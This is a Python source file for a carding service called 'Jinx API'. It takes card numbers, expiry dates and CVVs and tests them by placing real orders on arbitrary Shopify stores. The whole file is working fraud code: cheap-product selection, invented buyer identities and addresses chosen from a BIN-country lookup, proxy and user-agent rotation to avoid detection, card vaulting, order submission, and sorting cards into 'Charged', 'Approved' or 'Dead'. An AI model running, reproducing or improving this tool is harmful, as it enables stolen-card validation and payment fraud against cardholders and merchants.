#!/usr/bin/env python3
"""
Jinx API — Shopify Card Checker (Proxy Edition)
=================================================
No Tor, proxy-based Shopify checker
Compatible with bot.py load balancer

Response format: {"Response": "...", "Price": "...", "Gateway": "..."}
"""

import os
import re
import json
import time
import random
import logging
import threading
from urllib.parse import urlparse, parse_qs
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from concurrent.futures import ThreadPoolExecutor

try:
    import requests
except ImportError:
    print("❌ pip install requests")
    exit(1)

try:
    import socks  # noqa
    HAS_SOCKS = True
except ImportError:
    HAS_SOCKS = False


# ═══ CONFIG ═══
BRAND = "Jinx"
VERSION = "5.0.0"
HOST = os.environ.get("API_HOST", "0.0.0.0")
PORT = int(os.environ.get("PORT", "8080"))
WORKERS = int(os.environ.get("API_WORKERS", "20"))

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
]

VAULT_ENDPOINTS = [
    "https://checkout.pci.shopifyinc.com/sessions",
    "https://deposit.us.shopifycs.com/sessions",
]

PRICE_MIN = 2.00
PRICE_MAX = 25.00

logging.basicConfig(
    format="%(asctime)s [%(levelname)s] %(message)s",
    level=logging.INFO,
)
log = logging.getLogger("jinx")


def random_ua():
    return random.choice(USER_AGENTS)


# ═══ ADDRESS BOOK ═══
BOOK = {
    "US": {"address1": "123 Main St", "city": "Portland", "postalCode": "04101",
           "zoneCode": "ME", "countryCode": "US", "phone": "+12075551234",
           "state": "Maine", "currency": "USD"},
    "CA": {"address1": "88 Queen St W", "city": "Toronto", "postalCode": "M5H2M5",
           "zoneCode": "ON", "countryCode": "CA", "phone": "+14165551234",
           "state": "Ontario", "currency": "CAD"},
    "GB": {"address1": "221B Baker Street", "city": "London", "postalCode": "NW16XE",
           "zoneCode": "LND", "countryCode": "GB", "phone": "+442079460123",
           "state": "London", "currency": "GBP"},
    "MX": {"address1": "Av. Reforma 222", "city": "Ciudad de Mexico", "postalCode": "06600",
           "zoneCode": "CMX", "countryCode": "MX", "phone": "+525555555555",
           "state": "Ciudad de Mexico", "currency": "MXN"},
    "DEFAULT": {"address1": "123 Main St", "city": "Portland", "postalCode": "04101",
                "zoneCode": "ME", "countryCode": "US", "phone": "+12075551234",
                "state": "Maine", "currency": "USD"},
}

_bin_cache = {}
_bin_lock = threading.Lock()


def lookup_bin_country(bin6):
    bin6 = str(bin6)[:6]
    if not bin6.isdigit():
        return "US"
    with _bin_lock:
        if bin6 in _bin_cache:
            return _bin_cache[bin6]
    try:
        r = requests.get(f"https://bins.antipublic.cc/bins/{bin6}", timeout=5)
        if r.status_code == 200:
            d = r.json()
            c = (d.get("country_code") or d.get("country_alpha2") or "US").upper()
            with _bin_lock:
                _bin_cache[bin6] = c
            return c
    except Exception:
        pass
    with _bin_lock:
        _bin_cache[bin6] = "US"
    return "US"


def addr_for(cc_number):
    cc = lookup_bin_country(cc_number[:6])
    return BOOK.get(cc, BOOK["DEFAULT"])


# ═══ PROXY PARSER ═══
def parse_proxy(p):
    if not p:
        return None
    p = p.strip()
    if not p:
        return None
    if p.startswith(("socks5://", "socks5h://", "socks4://", "http://", "https://")):
        return p
    if "@" in p:
        return f"http://{p}"
    parts = p.split(":")
    if len(parts) == 4:
        ip, port, user, pw = parts
        return f"http://{user}:{pw}@{ip}:{port}"
    if len(parts) == 2:
        return f"http://{p}"
    return None


# ═══ QUERIES ═══
PROPOSAL_QUERY = (
    "query Proposal($delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,"
    "$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,"
    "$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,"
    "$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,"
    "$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,"
    "$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,"
    "$optionalDuties:OptionalDutiesInput,$captcha:CaptchaInput){"
    "session(sessionInput:$sessionInput){"
    "negotiate(input:{"
    "purchaseProposal:{"
    "delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,"
    "buyerIdentity:$buyerIdentity,taxes:$taxes,tip:$tip,note:$note,"
    "nonNegotiableTerms:$nonNegotiableTerms,"
    "localizationExtension:$localizationExtension,"
    "scriptFingerprint:$scriptFingerprint,"
    "optionalDuties:$optionalDuties,captcha:$captcha},"
    "checkpointData:$checkpointData,"
    "queueToken:$queueToken}){"
    "__typename result{"
    "... on NegotiationResultAvailable{checkpointData queueToken sellerProposal{"
    "__typename delivery{... on FilledDeliveryTerms{deliveryLines{id "
    "availableDeliveryStrategies{... on CompleteDeliveryStrategy{handle title __typename}__typename}"
    "__typename}__typename}__typename}"
    "payment{... on FilledPaymentTerms{availablePaymentLines{paymentMethod{"
    "... on PaymentProvider{paymentMethodIdentifier name __typename}"
    "__typename}__typename}__typename}__typename}__typename}"
    "__typename}... on CheckpointDenied{redirectUrl __typename}"
    "... on Throttled{pollAfter queueToken pollUrl __typename}"
    "... on NegotiationResultFailed{__typename}__typename}"
    "errors{code localizedMessage __typename}__typename}}}"
)

SUBMIT_QUERY = (
    "mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,"
    "$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,"
    "$analytics:AnalyticsInput){"
    "submitForCompletion(input:$input attemptToken:$attemptToken "
    "metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult "
    "analytics:$analytics){"
    "... on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}"
    "... on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}"
    "... on SubmitFailed{reason __typename}"
    "... on SubmitRejected{errors{... on NegotiationError{code localizedMessage nonLocalizedMessage __typename}__typename}__typename}"
    "... on Throttled{pollAfter pollUrl queueToken __typename}"
    "... on CheckpointDenied{redirectUrl __typename}"
    "... on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}"
    "__typename}}"
    "fragment ReceiptDetails on Receipt{"
    "... on ProcessedReceipt{id token orderIdentity{buyerIdentifier id __typename}__typename}"
    "... on ProcessingReceipt{id pollDelay __typename}"
    "... on ActionRequiredReceipt{id action{... on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}__typename}"
    "... on FailedReceipt{id processingError{... on PaymentFailed{code messageUntranslated __typename}__typename}__typename}"
    "__typename}"
)

POLL_QUERY = (
    "query PollForReceipt($receiptId:ID!,$sessionToken:String!){"
    "receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){"
    "...ReceiptDetails __typename}}"
    "fragment ReceiptDetails on Receipt{"
    "... on ProcessedReceipt{id token orderIdentity{buyerIdentifier id __typename}__typename}"
    "... on ProcessingReceipt{id pollDelay __typename}"
    "... on ActionRequiredReceipt{id action{... on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}__typename}"
    "... on FailedReceipt{id processingError{... on PaymentFailed{code messageUntranslated __typename}__typename}__typename}"
    "__typename}"
)

CODE_MAP = {
    "PAYMENTS_UNACCEPTABLE": "PAYMENTS_UNACCEPTABLE",
    "PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT": "PAYMENT_AMOUNT_INVALID",
    "PAYMENTS_UNACCEPTABLE_PAYMENT_METHOD": "PAYMENT_METHOD_REJECTED",
    "PAYMENTS_CREDIT_CARD_BASE_EXPIRED": "EXPIRED_CARD",
    "PAYMENTS_CREDIT_CARD_BASE_CVV_FAILED": "INVALID_CVV",
    "PAYMENTS_CREDIT_CARD_BASE_INCORRECT_NUMBER": "INCORRECT_NUMBER",
    "PAYMENTS_CREDIT_CARD_BASE_INVALID_NUMBER": "INVALID_NUMBER",
    "PAYMENTS_CREDIT_CARD_BASE_INVALID_CVV": "INVALID_CVV",
    "PAYMENTS_CREDIT_CARD_BASE_INVALID_EXPIRY": "INVALID_EXPIRY",
    "PAYMENTS_CREDIT_CARD_BASE_DECLINED": "CARD_DECLINED",
    "PAYMENTS_CREDIT_CARD_BASE_GENERIC_DECLINE": "GENERIC_DECLINE",
    "PAYMENTS_CREDIT_CARD_BASE_INSUFFICIENT_FUNDS": "INSUFFICIENT_FUNDS",
    "PAYMENTS_CREDIT_CARD_BASE_CALL_ISSUER": "CALL_ISSUER",
    "PAYMENTS_CREDIT_CARD_BASE_DO_NOT_HONOR": "DO_NOT_HONOR",
    "PAYMENTS_CREDIT_CARD_BASE_PICKUP_CARD": "PICKUP_CARD",
    "PAYMENTS_CREDIT_CARD_BASE_RESTRICTED_CARD": "RESTRICTED_CARD",
    "PAYMENTS_CREDIT_CARD_BASE_SECURITY_VIOLATION": "SECURITY_VIOLATION",
    "PAYMENTS_CREDIT_CARD_BASE_SERVICE_NOT_ALLOWED": "SERVICE_NOT_ALLOWED",
    "PAYMENTS_CREDIT_CARD_BASE_STOLEN_CARD": "STOLEN_CARD",
    "PAYMENTS_CREDIT_CARD_BASE_TRANSACTION_NOT_ALLOWED": "TRANSACTION_NOT_ALLOWED",
    "PAYMENTS_CREDIT_CARD_BASE_TRY_AGAIN_LATER": "TRY_AGAIN_LATER",
    "PAYMENTS_CREDIT_CARD_BASE_PROCESSING_ERROR": "PROCESSING_ERROR",
    "PAYMENT_FAILED": "CARD_DECLINED",
    "GENERIC_ERROR": "GENERIC_DECLINE",
}


def map_code(raw):
    return CODE_MAP.get(raw, raw) if raw else "CARD_DECLINED"


def checkout_sync(cc_raw, site_raw, proxy_raw, debug=False):
    out = {
        "Response": "SITE_ERROR",
        "Price": "-",
        "Gateway": "Shopify",
        "Status": "Site Error",
        "Card": cc_raw,
        "Site": site_raw,
        "Debug": "",
    }

    def dbg(msg):
        if debug:
            out["Debug"] += f" | {msg}"
        log.warning(f"[{cc_raw[:6]}] {msg}")

    parts = cc_raw.split("|")
    if len(parts) != 4:
        out["Response"] = "INVALID_FORMAT"
        return out

    cc, mm, yyyy, cvv = parts
    if len(yyyy) == 2:
        yyyy = "20" + yyyy

    site = re.sub(r"^https?://", "", site_raw.strip()).rstrip("/")
    proxy_url = parse_proxy(proxy_raw) if proxy_raw else None

    a = addr_for(cc)
    currency = a.get("currency", "USD")
    country = a.get("countryCode", "US")
    first_name = random.choice(["James", "John", "Robert", "Michael", "David"])
    last_name = random.choice(["Smith", "Johnson", "Williams", "Brown", "Jones"])
    email = f"{first_name.lower()}.{last_name.lower()}{random.randint(1, 9999)}@gmail.com"

    ua = random_ua()
    dbg(f"START proxy={bool(proxy_url)} country={country}")

    s = requests.Session()
    s.headers.update({
        "User-Agent": ua,
        "Accept-Language": "en-US,en;q=0.9",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    })
    if proxy_url:
        s.proxies.update({"http": proxy_url, "https": proxy_url})

    no_proxy_sess = requests.Session()
    no_proxy_sess.headers.update({"User-Agent": ua})

    try:
        # Warmup
        try:
            s.get(f"https://{site}/", timeout=10)
            time.sleep(0.2)
            dbg("warmup OK")
        except Exception:
            pass

        # Products
        try:
            r = s.get(f"https://{site}/products.json", timeout=15)
            dbg(f"products.json → {r.status_code}")
        except Exception:
            out["Response"] = "PROXY_FAIL"
            out["Status"] = "Proxy Error"
            return out

        if r.status_code == 404:
            out["Response"] = "SITE_DEAD"
            out["Status"] = "Site Error"
            return out

        if r.status_code != 200:
            out["Response"] = f"PRODUCTS_HTTP_{r.status_code}"
            out["Status"] = "Site Error"
            return out

        try:
            data = r.json()
        except Exception:
            out["Response"] = "SITE_ERROR"
            out["Status"] = "Site Error"
            return out

        valid = []
        blacklist = ["sample", "free", "gift", "test", "donation", "tip"]
        for p in data.get("products", []):
            title = (p.get("title") or "").lower()
            if any(w in title for w in blacklist):
                continue
            for v in p.get("variants", []):
                if not v.get("available", True):
                    continue
                try:
                    price = float(str(v.get("price", "999")).replace(",", ""))
                except Exception:
                    continue
                if PRICE_MIN <= price <= PRICE_MAX:
                    valid.append({"id": v["id"], "price": price})

        if not valid:
            out["Response"] = "SITE_ERROR"
            out["Status"] = "Site Error"
            return out

        valid.sort(key=lambda x: x["price"])
        mid = min(len(valid) // 2, len(valid) - 1)
        vid = valid[mid]["id"]
        out["Price"] = f"{valid[mid]['price']:.2f}"
        dbg(f"Picked ${out['Price']}")

        # Cart add
        cart_token = None
        cart_ok = False

        try:
            r = s.post(f"https://{site}/cart/add.js",
                headers={"Accept": "application/json",
                         "Content-Type": "application/json",
                         "Referer": f"https://{site}/",
                         "Origin": f"https://{site}"},
                json={"items": [{"id": int(vid), "quantity": 1}]},
                timeout=15)
            dbg(f"cart/add.js JSON → {r.status_code}")
            if r.status_code == 200:
                cart_ok = True
        except Exception:
            pass

        if not cart_ok:
            try:
                r = s.post(f"https://{site}/cart/add.js",
                    headers={"Accept": "application/json",
                             "Content-Type": "application/x-www-form-urlencoded",
                             "Referer": f"https://{site}/",
                             "Origin": f"https://{site}"},
                    data={"id": str(vid), "quantity": "1", "form_type": "product"},
                    timeout=15)
                dbg(f"cart/add.js form → {r.status_code}")
                if r.status_code == 200:
                    cart_ok = True
            except Exception:
                pass

        if not cart_ok:
            out["Response"] = "SITE_ERROR"
            out["Status"] = "Site Error"
            return out

        # Cart token
        for _ in range(3):
            try:
                r = s.get(f"https://{site}/cart.js", timeout=15)
                j = r.json()
                cart_token = j.get("token")
                if cart_token:
                    break
                time.sleep(0.3)
            except Exception:
                time.sleep(0.3)

        if not cart_token:
            out["Response"] = "SITE_ERROR"
            out["Status"] = "Site Error"
            return out

        # Checkout init
        try:
            r = s.post(f"https://{site}/cart",
                headers={"Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
                         "Content-Type": "application/x-www-form-urlencoded",
                         "Origin": f"https://{site}",
                         "Referer": f"https://{site}/cart",
                         "Upgrade-Insecure-Requests": "1"},
                data={"checkout": "", "updates[]": "1"},
                allow_redirects=False, timeout=15)

            if r.status_code not in (301, 302, 303, 307, 308):
                out["Response"] = "SITE_ERROR"
                out["Status"] = "Site Error"
                return out

            loc1 = r.headers.get("location", "")
            r2 = s.get(loc1, allow_redirects=False, timeout=15)
            final_url = r2.headers.get("location", "") if r2.status_code in (301, 302, 303, 307, 308) else loc1
            r3 = s.get(final_url, timeout=25)
            html = r3.text
            dbg(f"Checkout {len(html)} bytes")
        except Exception:
            out["Response"] = "SITE_ERROR"
            out["Status"] = "Site Error"
            return out

        if len(html) < 500:
            out["Response"] = "SITE_ERROR"
            out["Status"] = "Site Error"
            return out

        # Session token
        session_token = None
        for pat in [r'"serializedSessionToken"\s*:\s*"([^"]+)"',
                    r'"sessionToken"\s*:\s*"([^"]+)"',
                    r'serialized-sessionToken[^>]*content="&quot;([^&]+)&quot;"']:
            m = re.search(pat, html)
            if m:
                session_token = m.group(1)
                break

        if not session_token:
            out["Response"] = "SITE_ERROR"
            out["Status"] = "Site Error"
            return out

        queue_token = ""
        for pat in [r'"queueToken"\s*:\s*"([^"]+)"', r'queueToken&quot;:&quot;([^&]+)&quot;']:
            m = re.search(pat, html)
            if m:
                queue_token = m.group(1)
                break

        stable_id = ""
        for pat in [r'"stableId"\s*:\s*"([^"]+)"', r'stableId&quot;:&quot;([^&]+)&quot;']:
            m = re.search(pat, html)
            if m:
                stable_id = m.group(1)
                break

        attempt_token = ""
        m = re.search(r"/checkouts/cn/([a-zA-Z0-9]+)", final_url)
        if m:
            attempt_token = m.group(1)

        # Proposal
        gql_url = f"https://{site}/checkouts/unstable/graphql"
        gql_headers = {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Origin": f"https://{site}",
            "Referer": f"https://{site}/",
            "X-Checkout-One-Session-Token": session_token,
            "X-Checkout-Web-Deploy-Stage": "production",
            "X-Checkout-Web-Server-Handling": "fast",
            "X-Checkout-Web-Source-Id": attempt_token,
        }

        addr_obj = {
            "address1": a["address1"], "city": a["city"],
            "countryCode": country, "postalCode": a["postalCode"],
            "firstName": first_name, "lastName": last_name,
            "zoneCode": a["zoneCode"], "phone": a["phone"],
        }

        state = {"queue": queue_token, "checkpoint": None, "delivery": ""}

        def proposal_payload(handle=None):
            dv = {
                "deliveryLines": [{
                    "destination": {"streetAddress": addr_obj},
                    "targetMerchandiseLines": (
                        {"lines": [{"stableId": stable_id or "1"}]} if handle else {"any": True}),
                    "deliveryMethodTypes": ["SHIPPING"],
                    "expectedTotalPrice": {"any": True},
                    "destinationChanged": (handle is None),
                }],
                "noDeliveryRequired": [], "useProgressiveRates": False,
                "prefetchShippingRatesStrategy": None,
            }
            if handle:
                dv["deliveryLines"][0]["selectedDeliveryStrategy"] = {
                    "deliveryStrategyByHandle": {"handle": handle, "customDeliveryRate": False},
                    "options": {}}
            else:
                dv["deliveryLines"][0]["selectedDeliveryStrategy"] = {
                    "deliveryStrategyMatchingConditions": {
                        "estimatedTimeInTransit": {"any": True},
                        "shipments": {"any": True}},
                    "options": {}}

            return {
                "query": PROPOSAL_QUERY,
                "variables": {
                    "sessionInput": {"sessionToken": session_token},
                    "queueToken": state["queue"] or "",
                    "checkpointData": state["checkpoint"],
                    "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": dv,
                    "merchandise": {"merchandiseLines": [{
                        "stableId": stable_id or "1",
                        "merchandise": {"productVariantReference": {
                            "id": f"gid://shopify/ProductVariantMerchandise/{vid}",
                            "variantId": f"gid://shopify/ProductVariant/{vid}",
                            "properties": [], "sellingPlanId": None, "sellingPlanDigest": None}},
                        "quantity": {"items": {"value": 1}},
                        "expectedTotalPrice": {"any": True},
                        "lineComponentsSource": None, "lineComponents": []}]},
                    "payment": {"totalAmount": {"any": True}, "paymentLines": [],
                                "billingAddress": {"streetAddress": addr_obj}},
                    "buyerIdentity": {
                        "customer": {"presentmentCurrency": currency, "countryCode": country},
                        "email": email, "emailChanged": False,
                        "phoneCountryCode": country,
                        "marketingConsent": [{"email": {"value": email}}],
                        "shopPayOptInPhone": {"countryCode": country}, "rememberMe": False},
                    "tip": {"tipLines": []},
                    "taxes": {"proposedAllocations": None,
                        "proposedTotalAmount": {"value": {"amount": "0", "currencyCode": currency}},
                        "proposedTotalIncludedAmount": None,
                        "proposedMixedStateTotalAmount": None, "proposedExemptions": []},
                    "note": {"message": None, "customAttributes": []},
                    "localizationExtension": {"fields": []},
                    "nonNegotiableTerms": None,
                    "scriptFingerprint": {"signature": None, "signatureUuid": None,
                        "lineItemScriptChanges": [], "paymentScriptChanges": [],
                        "shippingScriptChanges": []},
                    "optionalDuties": {"buyerRefusesDuties": False},
                },
                "operationName": "Proposal",
            }

        for _ in range(6):
            try:
                r = s.post(gql_url, headers=gql_headers, json=proposal_payload(), timeout=20)
                j = r.json()
            except Exception:
                time.sleep(1)
                continue

            if j.get("errors"):
                break

            negotiate = j.get("data", {}).get("session", {}).get("negotiate", {})
            result_r = negotiate.get("result", {}) or {}
            tn = result_r.get("__typename", "")

            if tn != "NegotiationResultAvailable":
                time.sleep(1)
                continue

            state["queue"] = result_r.get("queueToken") or state["queue"]
            state["checkpoint"] = result_r.get("checkpointData") or state["checkpoint"]
            seller = result_r.get("sellerProposal", {}) or {}
            delivery = seller.get("delivery", {}) or {}

            if delivery.get("__typename") == "FilledDeliveryTerms":
                dl = delivery.get("deliveryLines", []) or []
                if dl:
                    strats = dl[0].get("availableDeliveryStrategies", []) or []
                    if strats:
                        state["delivery"] = strats[0].get("handle", "")
                        break
            time.sleep(1)

        if not state["delivery"]:
            out["Response"] = "SITE_ERROR"
            out["Status"] = "Site Error"
            return out

        try:
            r = s.post(gql_url, headers=gql_headers, json=proposal_payload(state["delivery"]), timeout=20)
            j = r.json()
        except Exception:
            out["Response"] = "SITE_ERROR"
            out["Status"] = "Site Error"
            return out

        negotiate = j.get("data", {}).get("session", {}).get("negotiate", {})
        result_r = negotiate.get("result", {}) or {}
        payment_method_id = ""
        if result_r.get("__typename") == "NegotiationResultAvailable":
            state["checkpoint"] = result_r.get("checkpointData") or state["checkpoint"]
            state["queue"] = result_r.get("queueToken") or state["queue"]
            seller = result_r.get("sellerProposal", {}) or {}
            pl = (seller.get("payment", {}) or {}).get("availablePaymentLines", []) or []
            if pl:
                payment_method_id = pl[0].get("paymentMethod", {}).get("paymentMethodIdentifier", "")

        if not payment_method_id:
            out["Response"] = "SITE_ERROR"
            out["Status"] = "Site Error"
            return out

        # Vault
        vault_payload = {
            "credit_card": {"number": cc, "month": int(mm), "year": int(yyyy),
                            "verification_value": cvv,
                            "name": f"{first_name} {last_name}"},
            "payment_session_scope": site,
        }
        payment_session_id = None
        for url in VAULT_ENDPOINTS:
            try:
                r = no_proxy_sess.post(url, json=vault_payload,
                    headers={"Content-Type": "application/json",
                             "Accept": "application/json",
                             "Origin": "https://checkout.shopifycs.com",
                             "Referer": "https://checkout.shopifycs.com/",
                             "User-Agent": ua}, timeout=15)
                if r.status_code == 200:
                    pid = r.json().get("id")
                    if pid:
                        payment_session_id = pid
                        break
            except Exception:
                pass

        if not payment_session_id:
            out["Response"] = "VAULT_FAILED"
            out["Status"] = "Site Error"
            return out

        # Submit
        submit_payload = {
            "query": SUBMIT_QUERY,
            "variables": {
                "input": {
                    "checkpointData": state["checkpoint"],
                    "sessionInput": {"sessionToken": session_token},
                    "queueToken": state["queue"] or "",
                    "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": {"deliveryLines": [{
                        "selectedDeliveryStrategy": {
                            "deliveryStrategyByHandle": {"handle": state["delivery"], "customDeliveryRate": False},
                            "options": {}},
                        "targetMerchandiseLines": {"lines": [{"stableId": stable_id or "1"}]},
                        "destination": {"streetAddress": addr_obj},
                        "deliveryMethodTypes": ["SHIPPING"],
                        "expectedTotalPrice": {"any": True},
                        "destinationChanged": False}],
                        "noDeliveryRequired": [], "useProgressiveRates": False},
                    "merchandise": {"merchandiseLines": [{
                        "stableId": stable_id or "1",
                        "merchandise": {"productVariantReference": {
                            "id": f"gid://shopify/ProductVariantMerchandise/{vid}",
                            "variantId": f"gid://shopify/ProductVariant/{vid}",
                            "properties": [], "sellingPlanId": None, "sellingPlanDigest": None}},
                        "quantity": {"items": {"value": 1}},
                        "expectedTotalPrice": {"any": True},
                        "lineComponentsSource": None, "lineComponents": []}]},
                    "payment": {"totalAmount": {"any": True},
                        "paymentLines": [{"paymentMethod": {"directPaymentMethod": {
                            "paymentMethodIdentifier": payment_method_id,
                            "sessionId": payment_session_id,
                            "billingAddress": {"streetAddress": addr_obj},
                            "cardSource": None}},
                            "amount": {"any": True}, "dueAt": None}],
                        "billingAddress": {"streetAddress": addr_obj}},
                    "buyerIdentity": {
                        "buyerIdentity": {"presentmentCurrency": currency, "countryCode": country},
                        "contactInfoV2": {"emailOrSms": {"value": email, "emailOrSmsChanged": False}},
                        "marketingConsent": [{"email": {"value": email}}],
                        "shopPayOptInPhone": {"countryCode": country}},
                    "tip": {"tipLines": []},
                    "taxes": {"proposedAllocations": None,
                        "proposedTotalAmount": {"value": {"amount": "0", "currencyCode": currency}},
                        "proposedTotalIncludedAmount": None,
                        "proposedMixedStateTotalAmount": None, "proposedExemptions": []},
                    "note": {"message": None, "customAttributes": []},
                    "localizationExtension": {"fields": []},
                    "nonNegotiableTerms": None,
                    "scriptFingerprint": {"signature": None, "signatureUuid": None,
                        "lineItemScriptChanges": [], "paymentScriptChanges": [],
                        "shippingScriptChanges": []},
                    "optionalDuties": {"buyerRefusesDuties": False},
                },
                "attemptToken": f"{attempt_token}-{random.random()}",
                "metafields": [],
                "analytics": {"requestUrl": final_url},
            },
            "operationName": "SubmitForCompletion",
        }

        try:
            r = s.post(gql_url, headers=gql_headers, json=submit_payload, timeout=25)
            j = r.json()
        except Exception:
            out["Response"] = "SITE_ERROR"
            out["Status"] = "Site Error"
            return out

        c = j.get("data", {}).get("submitForCompletion", {})
        tn = c.get("__typename", "")

        if tn not in ("SubmitSuccess", "SubmittedForCompletion", "SubmitAlreadyAccepted"):
            errs = c.get("errors", [])
            if errs:
                code = errs[0].get("code", "")
                out["Response"] = map_code(code) if code else "CARD_DECLINED"
                out["Status"] = "Dead"
            else:
                out["Response"] = "CARD_DECLINED"
                out["Status"] = "Dead"
            return out

        rid = (c.get("receipt", {}) or {}).get("id", "")
        if not rid:
            out["Response"] = "SITE_ERROR"
            out["Status"] = "Site Error"
            return out

        # Poll
        for _ in range(8):
            time.sleep(2)
            try:
                r = s.post(gql_url, headers=gql_headers,
                    json={"query": POLL_QUERY,
                          "variables": {"receiptId": rid, "sessionToken": session_token},
                          "operationName": "PollForReceipt"}, timeout=25)
                j = r.json()
            except Exception:
                continue

            receipt = j.get("data", {}).get("receipt", {}) or {}
            rtn = receipt.get("__typename", "")

            if rtn == "ProcessedReceipt" or "orderIdentity" in receipt:
                out["Response"] = "ORDER_PLACED"
                out["Status"] = "Charged"
                out["Gateway"] = "Shopify Payments"
                return out

            if rtn == "ActionRequiredReceipt":
                out["Response"] = "3DS_REQUIRED"
                out["Status"] = "Approved"
                out["Gateway"] = "Shopify Payments"
                return out

            if rtn == "FailedReceipt":
                pe = receipt.get("processingError", {}) or {}
                code = pe.get("code", "CARD_DECLINED")
                out["Response"] = map_code(code) if code else "CARD_DECLINED"
                if code in ("INSUFFICIENT_FUNDS", "OTP_REQUIRED"):
                    out["Status"] = "Approved"
                    out["Gateway"] = "Shopify Payments"
                else:
                    out["Status"] = "Dead"
                return out

        out["Response"] = "SITE_ERROR"
        out["Status"] = "Site Error"
        return out

    except Exception as e:
        dbg(f"TOP EXC: {type(e).__name__}")
        out["Response"] = f"EXCEPTION_{type(e).__name__}"
        out["Status"] = "Site Error"
        return out
    finally:
        try:
            s.close()
        except Exception:
            pass
        try:
            no_proxy_sess.close()
        except Exception:
            pass


# ═══ HTTP HANDLER ═══
class Handler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def _send_json(self, status, payload):
        try:
            body = json.dumps(payload).encode("utf-8")
            self.send_response(status)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.send_header("Access-Control-Allow-Origin", "*")
            self.send_header("Connection", "close")
            self.end_headers()
            self.wfile.write(body)
        except Exception:
            pass

    def log_message(self, fmt, *args):
        sys.stderr.write(f"[{BRAND.lower()}-api] " + (fmt % args) + "\n")

    def do_GET(self):
        parsed = urlparse(self.path)
        path = parsed.path
        qs = parse_qs(parsed.query, keep_blank_values=True)

        if path in ("/", "/health"):
            self._send_json(200, {
                "status": "ok",
                "service": "jinx-api",
                "version": VERSION,
                "socks_support": HAS_SOCKS,
            })
            return

        if path.lower() in ("/shopify", "/shopify/"):
            cc = (qs.get("cc", [""])[0] or "").strip()
            site = (qs.get("site", [""])[0] or "").strip()
            proxy = (qs.get("proxy", [""])[0] or "").strip() or None
            debug = (qs.get("debug", ["0"])[0]) == "1"

            if not cc or not site:
                self._send_json(400, {
                    "Response": "MISSING_PARAMS",
                    "Price": "-",
                    "Gateway": "UNKNOWN",
                    "Status": "Site Error",
                })
                return

            try:
                loop_result = executor.submit(checkout_sync, cc, site, proxy, debug).result(timeout=180)
                resp = {
                    "Response": loop_result.get("Response", "CARD_DECLINED"),
                    "Price": loop_result.get("Price", "-"),
                    "Gateway": loop_result.get("Gateway", "Shopify"),
                    "Status": loop_result.get("Status", "Dead"),
                }
                if debug:
                    resp["Debug"] = loop_result.get("Debug", "")
                self._send_json(200, resp)
            except Exception as e:
                self._send_json(500, {
                    "Response": f"SERVER_ERROR: {str(e)[:80]}",
                    "Price": "-",
                    "Gateway": "UNKNOWN",
                    "Status": "Site Error",
                })
            return

        self._send_json(404, {"error": "not found"})

    def do_POST(self):
        self.do_GET()


# ═══ MAIN ═══
executor = ThreadPoolExecutor(max_workers=WORKERS)


def main():
    print(f"Jinx-api v{VERSION} starting on http://{HOST}:{PORT}")
    print(f"Workers: {WORKERS}")
    print(f"SOCKS support: {HAS_SOCKS}")
    print(f"Endpoint: GET /Shopify?cc=<card>&site=<site>&proxy=<optional>&debug=0|1")
    server = ThreadingHTTPServer((HOST, PORT), Handler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("Shutting down...")


if __name__ == "__main__":
    import sys
    main()
